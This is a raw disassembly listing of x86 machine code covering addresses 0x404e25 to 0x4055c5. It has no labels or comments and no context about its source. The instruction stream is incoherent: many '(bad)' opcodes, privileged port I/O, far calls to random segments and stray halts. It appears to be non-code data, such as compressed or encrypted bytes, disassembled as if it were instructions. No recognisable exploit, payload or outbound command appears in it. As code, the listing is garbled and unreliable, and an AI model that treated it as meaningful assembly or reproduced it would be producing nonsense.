  404e25:	mov    ah,0xc3
  404e27:	inc    ecx
  404e28:	and    al,0x9
  404e2a:	push   ss
  404e2b:	aas    
  404e2c:	hlt    
  404e2d:	pusha  
  404e2e:	int3   
  404e2f:	cmp    edx,esi
  404e31:	push   es
  404e32:	or     dl,dl
  404e34:	shr    ecx,0x9a
  404e37:	and    al,0xab
  404e39:	fimul  DWORD PTR [edi+0x1]
  404e3c:	jge    0x404dda
  404e3e:	mov    ah,BYTE PTR [edi+0x1e8ba5e3]
  404e44:	nop
  404e45:	xchg   BYTE PTR [ecx+edi*1],ch
  404e48:	mov    cl,0x9d
  404e4a:	gs fwait
  404e4c:	dec    esp
  404e4d:	inc    esi
  404e4e:	xor    esp,DWORD PTR [edi]
  404e50:	pop    ds
  404e51:	(bad)  
  404e52:	dec    esi
  404e53:	call   0x27b4:0xca9d591e
  404e5a:	es (bad) 
  404e5c:	xchg   edx,eax
  404e5d:	fcom   QWORD PTR [eax+0x24]
  404e60:	mov    dl,0xd6
  404e62:	mov    bl,0xe0
  404e64:	out    dx,eax
  404e65:	sbb    al,0x6d
  404e67:	pusha  
  404e68:	ss xor ebx,eax
  404e6b:	or     BYTE PTR [ebx-0x5b6c1694],dh
  404e71:	cmc    
  404e72:	(bad)  [edi-0x66]
  404e75:	lahf   
  404e76:	popf   
  404e77:	and    eax,0xa3a0472a
  404e7c:	(bad)  
  404e7d:	int    0x50
  404e7f:	out    dx,al
  404e80:	push   ss
  404e81:	adc    eax,0x1fa7453b
  404e86:	cmc    
  404e87:	push   ds
  404e88:	sahf   
  404e89:	fwait
  404e8a:	dec    ecx
  404e8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e8c:	dec    edi
  404e8d:	add    dl,BYTE PTR [edx]
  404e8f:	adc    DWORD PTR [ecx],ecx
  404e91:	xchg   BYTE PTR [edx-0x3571e453],bl
  404e97:	es jae 0x404e68
  404e9a:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  404e9c:	mov    ch,0x53
  404e9e:	mov    cl,0xf
  404ea0:	out    0xd9,eax
  404ea2:	adc    al,0x93
  404ea4:	mov    dl,0x37
  404ea6:	pop    ebp
  404ea7:	jp     0x404ee1
  404ea9:	inc    ebp
  404eaa:	adc    eax,0x210851d8
  404eaf:	or     eax,0x5a98380a
  404eb4:	jp     0x404e70
  404eb6:	loop   0x404ea2
  404eb8:	shr    dh,0x86
  404ebb:	sub    eax,0x1d5a6401
  404ec0:	daa    
  404ec1:	(bad)  
  404ec3:	retf   0xb8d
  404ec6:	cli    
  404ec7:	loopne 0x404ed7
  404ec9:	pop    ds
  404eca:	dec    esi
  404ecb:	pop    ecx
  404ecc:	out    0x7d,al
  404ece:	call   0x9e86:0xfcd03aed
  404ed5:	fwait
  404ed6:	and    DWORD PTR [edi+0x56aca9d2],0xa5da9f65
  404ee0:	mov    ch,0x20
  404ee2:	hlt    
  404ee3:	xchg   ebp,eax
  404ee4:	add    bh,cl
  404ee6:	sbb    ah,ch
  404ee8:	(bad)  
  404ee9:	(bad)  
  404eeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404eec:	sahf   
  404eed:	test   eax,0x18afbf4d
  404ef2:	sub    ch,BYTE PTR [eax+0x2]
  404ef5:	xor    cl,BYTE PTR ds:0x3380b5de
  404efb:	mov    eax,ds:0x8f2982d4
  404f00:	adc    al,0xc3
  404f02:	and    ch,BYTE PTR [esi+0x39fd04dd]
  404f08:	imul   eax,DWORD PTR [ebx+0x6a5e1d5a],0xffffffb9
  404f0f:	xchg   edi,eax
  404f10:	dec    esi
  404f11:	pop    eax
  404f12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f13:	and    ecx,DWORD PTR [ebx]
  404f15:	test   BYTE PTR [ebp+edi*2+0x6f],dh
  404f19:	retf   
  404f1a:	inc    ecx
  404f1b:	pop    ss
  404f1c:	repz fdivr st(1),st
  404f1f:	mov    al,ds:0x99fa9193
  404f24:	adc    BYTE PTR [ebx],bh
  404f26:	ret    0x4980
  404f29:	retf   0xa69a
  404f2c:	sahf   
  404f2d:	jle    0x404f2e
  404f2f:	in     eax,dx
  404f30:	shld   DWORD PTR [eax-0x59],esp,0x26
  404f35:	xor    ah,0xf7
  404f38:	stos   BYTE PTR es:[edi],al
  404f39:	and    DWORD PTR ds:0xaccab2c8,ecx
  404f3f:	test   al,0x23
  404f41:	mov    bh,0x47
  404f43:	aam    0xf2
  404f45:	or     ebp,DWORD PTR ds:0x3525803
  404f4b:	inc    ecx
  404f4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f4d:	pop    ecx
  404f4e:	call   0xf15e:0xcac69dc6
  404f55:	into   
  404f56:	loop   0x404ef4
  404f58:	pop    ss
  404f59:	push   ecx
  404f5a:	call   0x89cd:0x2d85f7f3
  404f61:	jmp    0x2ef9:0xbf8fa702
  404f68:	and    eax,0x12277cbd
  404f6d:	inc    ebx
  404f6e:	icebp  
  404f6f:	jl     0x404fde
  404f71:	repz sub DWORD PTR [ebx-0x5135088d],eax
  404f78:	cmp    ch,BYTE PTR [esi-0x66]
  404f7b:	(bad)
  404f7e:	arpl   WORD PTR [ecx],bp
  404f80:	shl    BYTE PTR [ebx],0x9a
  404f83:	imul   ebp,DWORD PTR [ebx+0x2b],0xd9325dc
  404f8a:	or     al,0x99
  404f8c:	jle    0x404f8c
  404f8e:	sbb    dl,ch
  404f90:	ds push es
  404f92:	cmp    esi,DWORD PTR [edi]
  404f94:	shl    DWORD PTR [eax],1
  404f96:	call   0xbd12:0xf6972780
  404f9d:	add    eax,DWORD PTR [ecx]
  404f9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fa0:	das    
  404fa1:	jnp    0x40500b
  404fa3:	into   
  404fa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fa5:	jl     0x404fba
  404fa7:	mov    al,0xb2
  404fa9:	outs   dx,DWORD PTR ds:[esi]
  404faa:	push   ss
  404fab:	in     eax,dx
  404fac:	sbb    dh,BYTE PTR [edi+edi*2+0x32]
  404fb0:	jmp    0x404fbd
  404fb2:	jmp    0x46d3843b
  404fb7:	cwde   
  404fb8:	add    eax,0x22269b22
  404fbd:	clc    
  404fbe:	sub    esi,DWORD PTR [ebx]
  404fc0:	pop    esp
  404fc1:	adc    dl,BYTE PTR [edx-0x1e]
  404fc4:	jbe    0x404fd1
  404fc6:	ins    DWORD PTR es:[edi],dx
  404fc7:	pop    ebx
  404fc8:	and    eax,0x2a3e2852
  404fcd:	leave  
  404fce:	in     al,dx
  404fcf:	clc    
  404fd0:	mov    BYTE PTR [ecx],al
  404fd2:	jo     0x404ff8
  404fd4:	xlat   BYTE PTR ds:[ebx]
  404fd5:	mov    ebx,0xfb55e997
  404fda:	fwait
  404fdb:	nop
  404fdc:	test   DWORD PTR [ebx],0x533494d3
  404fe2:	outs   dx,BYTE PTR ds:[esi]
  404fe3:	data16 mov ch,ah
  404fe6:	call   0xeef6:0x3adde759
  404fed:	mov    ebx,0xda959a49
  404ff2:	add    eax,0x3c8e20ac
  404ff7:	pop    esi
  404ff8:	jp     0x405005
  404ffa:	xor    al,0x9e
  404ffc:	(bad)  
  404ffd:	pusha  
  404ffe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fff:	div    BYTE PTR [edx-0x6c001162]
  405005:	sub    BYTE PTR [eax+0x10],al
  405008:	outs   dx,DWORD PTR ds:[esi]
  405009:	or     edi,DWORD PTR [eax+0x49]
  40500c:	(bad)  
  40500d:	out    dx,eax
  40500e:	iret   
  40500f:	push   ebx
  405010:	ja     0x404feb
  405012:	call   0xa004:0xae0c3caa
  405019:	sub    bh,BYTE PTR ds:[edx-0x18e72580]
  405020:	jno    0x404fba
  405022:	ins    DWORD PTR es:[edi],dx
  405023:	dec    ecx
  405024:	loopne 0x405020
  405026:	call   0xa569:0xc793b6c0
  40502d:	sbb    edi,DWORD PTR [eax-0x59]
  405030:	adc    eax,0xf285ec9
  405035:	in     al,dx
  405036:	iret   
  405037:	mov    edx,0xf1f789b2
  40503c:	mov    al,0xa0
  40503e:	dec    ebx
  40503f:	push   ebp
  405040:	xchg   edi,eax
  405041:	or     edx,DWORD PTR [edx]
  405043:	out    dx,al
  405044:	ret    0xc270
  405047:	sub    eax,DWORD PTR [edx+0xca49a7e]
  40504d:	add    esp,DWORD PTR [ecx-0x4b2f8ebe]
  405053:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405054:	daa    
  405055:	dec    ebx
  405056:	mov    ecx,0xc61ca66
  40505b:	jge    0x40508f
  40505d:	lock xchg ebp,eax
  40505f:	(bad)
  405062:	xchg   ebp,eax
  405063:	and    eax,0x94f9387d
  405068:	mov    dl,0x91
  40506a:	scas   eax,DWORD PTR es:[edi]
  40506b:	sbb    eax,0xa7b8c3ef
  405070:	xchg   edx,eax
  405071:	popf   
  405072:	stos   BYTE PTR es:[edi],al
  405073:	fsubr  DWORD PTR [eax]
  405075:	mov    dh,0x5d
  405077:	or     eax,0x375f01aa
  40507c:	cmp    al,0xff
  40507e:	std    
  40507f:	test   eax,0xbef8bfbd
  405084:	xchg   ebp,eax
  405085:	push   ebx
  405086:	mov    eax,0x36a2ad07
  40508b:	add    eax,0xcc3a23b2
  405090:	or     BYTE PTR [edi-0x3d],dh
  405093:	sbb    BYTE PTR [esp+ecx*1-0x77],dh
  405097:	rcl    DWORD PTR [edx-0x59a8e4e9],0x68
  40509e:	jnp    0x40502b
  4050a0:	lods   al,BYTE PTR ds:[esi]
  4050a1:	leave  
  4050a2:	adc    DWORD PTR [edi+0x72],esi
  4050a5:	retf   0xd45e
  4050a8:	pop    edi
  4050a9:	ds retf 0xefa7
  4050ad:	xchg   ebp,eax
  4050ae:	aam    0xc9
  4050b0:	push   esi
  4050b1:	sbb    BYTE PTR [eax+0x27],cl
  4050b4:	scas   al,BYTE PTR es:[edi]
  4050b5:	adc    eax,DWORD PTR [ebp+0x40]
  4050b8:	push   cs
  4050b9:	mov    edx,DWORD PTR [edi]
  4050bb:	jbe    0x40512f
  4050bd:	arpl   di,cx
  4050bf:	cmc    
  4050c0:	dec    BYTE PTR [ebx]
  4050c2:	sub    BYTE PTR [ecx-0x5b],dl
  4050c5:	ror    cl,cl
  4050c7:	push   edi
  4050c8:	mov    edi,0x3a735b39
  4050cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050cf:	mov    cl,0x4e
  4050d1:	in     eax,dx
  4050d2:	sbb    eax,0x53cb4a7
  4050d7:	push   ss
  4050d8:	push   0xffffffbc
  4050da:	inc    ecx
  4050db:	pop    esi
  4050dc:	mov    dl,0xf4
  4050de:	into   
  4050df:	xor    ebx,DWORD PTR [esi]
  4050e1:	gs ins DWORD PTR es:[edi],dx
  4050e3:	stos   BYTE PTR es:[edi],al
  4050e4:	xor    ecx,DWORD PTR [esi+ecx*2]
  4050e7:	jbe    0x4050f4
  4050e9:	cs pop esi
  4050eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050ed:	mov    bp,0xb26a
  4050f1:	lods   eax,DWORD PTR ds:[esi]
  4050f2:	pop    esp
  4050f3:	repnz out 0x37,al
  4050f6:	es icebp 
  4050f8:	pusha  
  4050f9:	loope  0x4050a9
  4050fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050fc:	enter  0xf655,0xa2
  405100:	adc    eax,0xaeb4ec72
  405105:	push   ebx
  405106:	std    
  405107:	in     eax,0xae
  405109:	test   al,0x5a
  40510b:	fcmovnbe st,st(6)
  40510d:	shr    BYTE PTR [edx],cl
  40510f:	mov    eax,0xe11c3b4c
  405114:	push   0x47
  405116:	shl    ah,0x9c
  405119:	dec    ebx
  40511a:	push   ecx
  40511b:	add    dh,BYTE PTR [edx+0x702302fd]
  405121:	ror    BYTE PTR [edi-0x59],cl
  405124:	fs dec ebp
  405126:	sbb    eax,0xb750f75f
  40512b:	sahf   
  40512c:	mov    dl,0xed
  40512e:	mov    DWORD PTR [edx],ebx
  405130:	loope  0x40519b
  405132:	outs   dx,BYTE PTR ds:[esi]
  405133:	sub    eax,0xa7f674f2
  405138:	test   al,0xfd
  40513a:	shr    BYTE PTR [edx+ebx*4-0x3e],cl
  40513e:	(bad)  
  40513f:	dec    ebx
  405140:	mov    cl,0x6
  405142:	lahf   
  405143:	xchg   DWORD PTR [esi+0x6f],eax
  405146:	js     0x4051bf
  405148:	push   ebp
  405149:	popa   
  40514a:	inc    ecx
  40514b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40514c:	jmp    0x8deb:0x208be07c
  405153:	sub    dh,BYTE PTR [edx-0x78519719]
  405159:	push   ds
  40515a:	mov    esi,0xfd0bef2b
  40515f:	or     dh,bh
  405161:	test   edi,0x9ae5d403
  405167:	and    BYTE PTR [esi+0x7b96a7f1],ch
  40516d:	push   0x1d5b8f4
  405172:	(bad)  
  405173:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405174:	pop    ds
  405175:	daa    
  405176:	jmp    0x4051ab
  405178:	inc    ebp
  405179:	add    eax,0xe60f5d94
  40517e:	shl    BYTE PTR [edi],cl
  405180:	out    0x13,al
  405182:	dec    esp
  405183:	or     eax,eax
  405185:	or     al,0x7c
  405187:	pusha  
  405188:	pop    ebp
  405189:	test   eax,0x9d0267db
  40518e:	(bad)  
  40518f:	push   ebp
  405190:	shr    bl,0x9a
  405193:	shr    DWORD PTR [eax-0x9dbde77],cl
  405199:	fwait
  40519a:	or     DWORD PTR [edi-0x110919ec],esp
  4051a0:	xchg   edx,eax
  4051a1:	aas    
  4051a2:	dec    esp
  4051a3:	ins    DWORD PTR es:[edi],dx
  4051a4:	mov    al,0xd6
  4051a6:	neg    DWORD PTR [ebp+0x37]
  4051a9:	jmp    FWORD PTR [eax]
  4051ab:	inc    edi
  4051ac:	sti    
  4051ad:	nop
  4051ae:	(bad)  
  4051af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051b0:	sahf   
  4051b1:	mov    cl,0xfc
  4051b3:	xchg   edi,eax
  4051b4:	dec    esp
  4051b5:	inc    edi
  4051b6:	or     al,0xf1
  4051b8:	mov    ch,0x1c
  4051ba:	dec    edi
  4051bb:	retf   0x87ed
  4051be:	jmp    0x7fa6:0xd9dc3a33
  4051c5:	jnp    0x40523e
  4051c7:	mov    ah,0x4e
  4051c9:	out    0x62,eax
  4051cb:	addr16 mov ecx,edx
  4051ce:	xchg   ebx,eax
  4051cf:	add    al,0xe5
  4051d1:	stc    
  4051d2:	es daa 
  4051d4:	cmc    
  4051d5:	ror    BYTE PTR ds:0x540bb360,0xe7
  4051dc:	dec    ecx
  4051dd:	fistp  WORD PTR [eax-0x17]
  4051e0:	or     BYTE PTR [ebp-0x66],ah
  4051e3:	dec    ebp
  4051e4:	add    DWORD PTR [eax+eax*4],esp
  4051e7:	cs jae 0x40522e
  4051ea:	dec    ebx
  4051eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051ec:	rcr    BYTE PTR [esi-0xe],cl
  4051ef:	dec    eax
  4051f0:	in     eax,dx
  4051f1:	ss sbb ch,al
  4051f4:	mov    dl,0xc0
  4051f6:	jmp    0x39dc:0xb6fdf6a6
  4051fd:	or     bh,cl
  4051ff:	sbb    al,0x6b
  405201:	fcomp  DWORD PTR [ecx-0x3]
  405204:	mov    ?,WORD PTR [ebx-0x32]
  405207:	js     0x4051bb
  405209:	mov    eax,0x8746efff
  40520e:	push   ds
  40520f:	add    ecx,ecx
  405211:	push   cs
  405212:	jle    0x40524f
  405214:	mov    cl,0x9f
  405216:	ds daa 
  405218:	jbe    0x40526b
  40521a:	gs ins DWORD PTR es:[edi],dx
  40521c:	mov    dl,0xf1
  40521e:	and    al,0x9d
  405220:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405221:	stos   DWORD PTR es:[edi],eax
  405222:	mov    eax,0x152dc488
  405227:	leave  
  405228:	dec    ebx
  405229:	or     al,0xe
  40522b:	sub    eax,0x39cfabf3
  405230:	adc    al,0x30
  405232:	call   0x6730:0x537ef14f
  405239:	(bad)  
  40523a:	shl    DWORD PTR [eax+0x1a8f5293],1
  405240:	push   ebx
  405241:	sti    
  405242:	pop    ebp
  405243:	retf   0x6e41
  405246:	(bad)  
  405247:	int3   
  405248:	inc    eax
  405249:	pop    eax
  40524a:	call   0x88ad:0x47561c2e
  405251:	or     edi,ebp
  405253:	mov    ebx,0x3b35aff8
  405258:	sub    edi,DWORD PTR ds:0x8e71c9a
  40525e:	rcl    dl,0x5f
  405261:	(bad)  
  405263:	dec    edi
  405264:	xor    DWORD PTR [ebx],ecx
  405266:	ret    
  405267:	pop    edi
  405268:	into   
  405269:	sub    eax,DWORD PTR [esi]
  40526b:	and    eax,0x8b9a969c
  405270:	repnz xlat BYTE PTR ds:[ebx]
  405272:	or     eax,0x389a55fd
  405277:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405278:	xor    cl,BYTE PTR [ebp-0x23]
  40527b:	in     al,dx
  40527c:	ja     0x40529b
  40527e:	push   ds
  40527f:	sbb    al,0xb3
  405281:	inc    ebp
  405282:	leave  
  405283:	icebp  
  405284:	xor    eax,0x32597516
  405289:	test   eax,0x690e0ab3
  40528e:	or     eax,0x82e58b47
  405293:	daa    
  405294:	std    
  405295:	cdq    
  405296:	xlat   BYTE PTR ds:[ebx]
  405297:	pop    es
  405298:	pop    eax
  405299:	or     al,0x42
  40529b:	push   ecx
  40529c:	iret   
  40529d:	add    al,0x52
  40529f:	icebp  
  4052a0:	into   
  4052a1:	repnz call 0xbc19:0x5b8062f4
  4052a9:	xchg   ebx,eax
  4052aa:	or     eax,0x9a189f7e
  4052af:	adc    DWORD PTR [edx+eiz*8],ebx
  4052b2:	sbb    eax,0x9d0b8640
  4052b7:	jae    0x4052c2
  4052b9:	or     eax,0x719450dd
  4052be:	fwait
  4052bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052c0:	ins    BYTE PTR es:[edi],dx
  4052c1:	mov    ecx,ecx
  4052c3:	arpl   WORD PTR [ecx],bp
  4052c5:	es jl  0x4052af
  4052c8:	or     al,0xb8
  4052ca:	ffreep st(5)
  4052cc:	shl    BYTE PTR [ecx],cl
  4052ce:	sti    
  4052cf:	icebp  
  4052d0:	push   ebx
  4052d1:	or     DWORD PTR [ebx+ebx*2],0x679a00d6
  4052d8:	ins    DWORD PTR es:[edi],dx
  4052d9:	push   esp
  4052da:	cmp    dl,dh
  4052dc:	aam    0xd2
  4052de:	je     0x405284
  4052e0:	mov    esi,cs
  4052e2:	test   ecx,esp
  4052e4:	xor    al,0xc3
  4052e6:	sbb    al,BYTE PTR [ecx+edi*2+0x6b]
  4052ea:	xchg   esp,ebp
  4052ec:	(bad)  [ebx-0x26]
  4052ef:	mov    cl,0x2d
  4052f1:	jne    0x405323
  4052f3:	xor    al,0xf2
  4052f5:	or     bh,BYTE PTR [edx-0x5a41f487]
  4052fb:	push   esi
  4052fc:	add    dh,cl
  4052fe:	out    dx,eax
  4052ff:	daa    
  405300:	add    DWORD PTR [ebp-0x43],0xffffffd5
  405304:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405305:	jns    0x40531c
  405307:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405308:	fsubp  st(2),st
  40530a:	retf   
  40530b:	(bad)  
  40530d:	or     eax,0x220245af
  405312:	xchg   ebp,eax
  405313:	ins    DWORD PTR es:[edi],dx
  405314:	sbb    bh,ah
  405316:	inc    ecx
  405317:	xchg   di,ax
  405319:	sbb    edi,DWORD PTR [ecx-0x50]
  40531c:	jbe    0x405388
  40531e:	jle    0x4052c7
  405320:	adc    DWORD PTR [edi+0x29],0x1d
  405324:	or     esp,DWORD PTR [ebp-0x24]
  405327:	push   0x26b0e2b2
  40532c:	mov    ss,WORD PTR [edx]
  40532e:	push   ecx
  40532f:	cmp    ah,BYTE PTR ds:0xe019260b
  405335:	adc    DWORD PTR [ecx],ebp
  405337:	jnp    0x4052bf
  405339:	das    
  40533a:	call   0xe6fc:0xee5666e8
  405341:	mov    WORD PTR [edi+eiz*4-0x4673f1ea],?
  405348:	jecxz  0x4053bb
  40534a:	sbb    dh,BYTE PTR ds:0xeb2720b2
  405350:	adc    BYTE PTR [eax+edx*4],0xf5
  405354:	cld    
  405355:	xor    BYTE PTR [eax+0x7a],ch
  405358:	xor    ch,BYTE PTR [ebx]
  40535a:	or     edi,DWORD PTR [ebx+0x55]
  40535d:	cld    
  40535e:	in     eax,dx
  40535f:	aas    
  405360:	dec    edx
  405361:	xchg   ecx,eax
  405362:	je     0x4052f4
  405364:	mov    bl,0xa2
  405366:	ds sti 
  405368:	cwde   
  405369:	aam    0x44
  40536b:	push   0xa9691f62
  405370:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405371:	shl    bl,cl
  405373:	sbb    DWORD PTR [ebx+ecx*1],esp
  405376:	mov    ds:0x5c04d355,eax
  40537b:	lahf   
  40537c:	push   esp
  40537d:	jae    0x405351
  40537f:	and    BYTE PTR [ebx],cl
  405381:	or     cl,BYTE PTR [eax+0x54835ef9]
  405387:	sbb    BYTE PTR [edi+0x9],dl
  40538a:	bound  eax,QWORD PTR [edi-0x58638c06]
  405390:	mov    DWORD PTR [ebx-0x575b4129],ebx
  405396:	push   eax
  405397:	push   0x8e5d5eb2
  40539c:	mov    esp,0x623b5ebe
  4053a1:	and    eax,0xb8a98ab
  4053a6:	out    0x8a,al
  4053a8:	pop    ebp
  4053a9:	loope  0x405406
  4053ab:	fidiv  WORD PTR [edx+0x18652e60]
  4053b1:	les    esi,FWORD PTR [edx+0x7d]
  4053b4:	or     ebx,DWORD PTR cs:[edi+0x1e]
  4053b8:	aad    0xa
  4053ba:	push   ds
  4053bb:	pop    edi
  4053bc:	pusha  
  4053bd:	xor    BYTE PTR [ebp-0x7a97ae18],dl
  4053c3:	cmp    DWORD PTR [ecx+0x61a0ceb3],0x938544f9
  4053cd:	fwait
  4053ce:	ret    0xcd18
  4053d1:	int    0x9a
  4053d3:	out    dx,al
  4053d4:	sub    edi,DWORD PTR [eax-0x68]
  4053d7:	jmp    0x4ff3:0x81a80c4c
  4053de:	dec    edx
  4053df:	mov    ebx,0xd5a6cc34
  4053e4:	sbb    ebx,DWORD PTR [ebx+0x1ff16ec7]
  4053ea:	call   0x592:0x3f72fd56
  4053f1:	mov    ebx,0x9b9d4f43
  4053f6:	mov    ecx,0x26509aa7
  4053fb:	push   eax
  4053fc:	icebp  
  4053fd:	lods   al,BYTE PTR ds:[esi]
  4053fe:	cmp    cl,BYTE PTR [edi]
  405400:	mov    bl,0xbd
  405402:	cwde   
  405403:	js     0x405429
  405405:	ds push eax
  405407:	sub    BYTE PTR [edx-0x53581874],al
  40540d:	dec    ebp
  40540e:	or     edx,DWORD PTR [esi-0x6a91ee2d]
  405414:	mov    dl,0xe6
  405416:	hlt    
  405417:	ret    
  405418:	aad    0xd4
  40541a:	inc    edi
  40541b:	mov    dh,BYTE PTR [eax-0x14d633f5]
  405421:	xor    al,0xb0
  405423:	call   0x1b2:0xede3a1df
  40542a:	call   0x4667a145
  40542f:	xor    edi,eax
  405431:	or     ecx,edi
  405433:	jp     0x4053fa
  405435:	add    al,BYTE PTR [ecx+0x60cf19c4]
  40543b:	pop    ebp
  40543c:	pop    edx
  40543d:	xchg   ebx,eax
  40543e:	call   0x5b36:0x1aee79a2
  405445:	cs cmp eax,0x30c403a7
  40544b:	and    esp,ebx
  40544d:	jmp    0x8ef26030
  405452:	fldcw  WORD PTR ds:0xb90dbcdc
  405458:	jg     0x405465
  40545a:	and    esi,esp
  40545c:	mov    WORD PTR [edi-0x14ed0e31],ds
  405462:	jo     0x40549b
  405464:	mov    dl,0x27
  405466:	or     DWORD PTR [esi+0x4f],0xffffff8b
  40546a:	jne    0x4054db
  40546c:	stc    
  40546d:	or     eax,DWORD PTR [eax+ebx*4+0x4e]
  405471:	sbb    cl,BYTE PTR ds:0x98033a7c
  405477:	in     al,0xa5
  405479:	icebp  
  40547a:	(bad)  
  40547c:	adc    eax,0x8ea98deb
  405481:	or     edi,DWORD PTR [ecx-0x7]
  405484:	in     eax,0x10
  405486:	mov    dl,0xb5
  405488:	mov    ecx,0x992e9aca
  40548d:	push   esp
  40548e:	push   ebx
  40548f:	inc    edx
  405490:	sub    cl,bh
  405492:	and    DWORD PTR [edi+0xb04d3da],esp
  405498:	enter  0xed5f,0xd8
  40549c:	mov    dl,0x47
  40549e:	jmp    0x405486
  4054a0:	xchg   ebx,eax
  4054a1:	dec    ebp
  4054a2:	cmc    
  4054a3:	lock cmp DWORD PTR [ecx],ecx
  4054a6:	add    BYTE PTR [ebx-0x4c],0xb0
  4054aa:	aaa    
  4054ab:	fiadd  WORD PTR [edi-0x74]
  4054ae:	inc    esp
  4054af:	ss ret 0x13bf
  4054b3:	xchg   ebx,eax
  4054b4:	sbb    cl,BYTE PTR [ebx]
  4054b6:	cwde   
  4054b7:	lods   al,BYTE PTR ds:[esi]
  4054b8:	pop    esi
  4054b9:	test   al,0x58
  4054bb:	(bad)  
  4054bd:	sbb    DWORD PTR [edx+0x5bd2c71d],0x86f2fab3
  4054c7:	aad    0xf6
  4054c9:	inc    ebx
  4054ca:	push   es
  4054cb:	icebp  
  4054cc:	mov    dl,0x87
  4054ce:	pop    edx
  4054cf:	mov    WORD PTR [edx],?
  4054d1:	cmp    DWORD PTR [ebx+0x39],eax
  4054d4:	mov    dl,0xf3
  4054d6:	mov    eax,ds:0xef9bf7a8
  4054db:	sub    dl,al
  4054dd:	or     eax,DWORD PTR [ebp+0x13c7c1fb]
  4054e3:	mov    ecx,0xe39ad1df
  4054e8:	or     eax,0x91fa5e6d
  4054ed:	repz cmp al,0x97
  4054f0:	push   ds
  4054f1:	xchg   ecx,eax
  4054f2:	cld    
  4054f3:	lods   eax,DWORD PTR ds:[esi]
  4054f4:	cld    
  4054f5:	push   ecx
  4054f6:	fwait
  4054f7:	mov    BYTE PTR [ecx+ebp*2],dh
  4054fa:	cmovle esp,edi
  4054fd:	xchg   esp,eax
  4054fe:	inc    esi
  4054ff:	mov    ch,0xaf
  405501:	or     ebp,DWORD PTR [ebx+0x12a0b412]
  405507:	(bad)  
  405508:	aas    
  405509:	and    eax,0xf0b244ed
  40550e:	ss or  eax,0xb334aec8
  405514:	adc    BYTE PTR [ecx+0x16],dh
  405517:	cdq    
  405518:	scas   eax,DWORD PTR es:[edi]
  405519:	jg     0x4054b5
  40551b:	lea    edi,[edi]
  40551d:	loope  0x40550f
  40551f:	mov    ds,WORD PTR [esi]
  405521:	dec    ebx
  405522:	call   0x6982:0x44cabb78
  405529:	jnp    0x4054fa
  40552b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40552c:	mov    edx,0xefb86540
  405531:	dec    edi
  405532:	js     0x405531
  405534:	push   eax
  405535:	in     eax,0x9a
  405537:	inc    ebx
  405538:	in     al,dx
  405539:	lods   al,BYTE PTR ds:[esi]
  40553a:	mov    al,0x79
  40553c:	add    BYTE PTR [eax+0x3f2ba70b],bh
  405542:	daa    
  405543:	das    
  405544:	mov    edx,DWORD PTR [edx-0xf]
  405547:	xlat   BYTE PTR ds:[ebx]
  405548:	mov    dl,0x8f
  40554a:	dec    ebp
  40554b:	mul    DWORD PTR [edx]
  40554d:	les    edx,FWORD PTR [edi-0x77]
  405550:	scas   eax,DWORD PTR es:[edi]
  405551:	or     ecx,DWORD PTR [ecx+0x40]
  405554:	daa    
  405555:	arpl   WORD PTR [bp+0x309e],si
  40555a:	call   0x3391:0x6f5719a6
  405561:	ret    
  405562:	retf   
  405563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405564:	(bad)  
  405565:	mov    DWORD PTR [edi+0x4be52103],ebx
  40556b:	out    dx,eax
  40556c:	mov    esi,cs
  40556e:	aas    
  40556f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405570:	mov    esi,0x2426cef2
  405575:	inc    ebp
  405576:	das    
  405577:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405578:	jecxz  0x4055b7
  40557a:	pop    ebx
  40557b:	dec    edi
  40557c:	cs inc eax
  40557e:	fwait
  40557f:	retf   
  405580:	mov    cl,0x68
  405582:	jmp    0x182d683c
  405587:	pop    ss
  405588:	aad    0x6d
  40558a:	pop    ds
  40558b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40558c:	xor    al,0x1e
  40558e:	dec    ebx
  40558f:	add    DWORD PTR [edx-0x23],ecx
  405592:	inc    ebx
  405593:	sub    DWORD PTR [edx-0x5dca6320],esi
  405599:	dec    esp
  40559a:	mov    al,0xc1
  40559c:	cmp    cl,BYTE PTR [ebx]
  40559e:	cwde   
  40559f:	pop    ecx
  4055a0:	mov    bh,BYTE PTR [edi+esi*8+0x2a]
  4055a4:	adc    DWORD PTR [ebp+0x4d5f8e9a],eax
  4055aa:	retf   
  4055ab:	and    eax,0xa74d7f4b
  4055b0:	stos   BYTE PTR es:[edi],al
  4055b1:	adc    DWORD PTR ds:0xc127774,ecx
  4055b7:	mov    WORD PTR [edx],gs
  4055b9:	cmp    al,0x94
  4055bb:	popf   
  4055bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055bd:	sbb    BYTE PTR [edi-0x63e04daf],ah
  4055c3:	sbb    ah,BYTE PTR [ebx]
  4055c5:	sub    BYTE PTR [ebx],0x9b
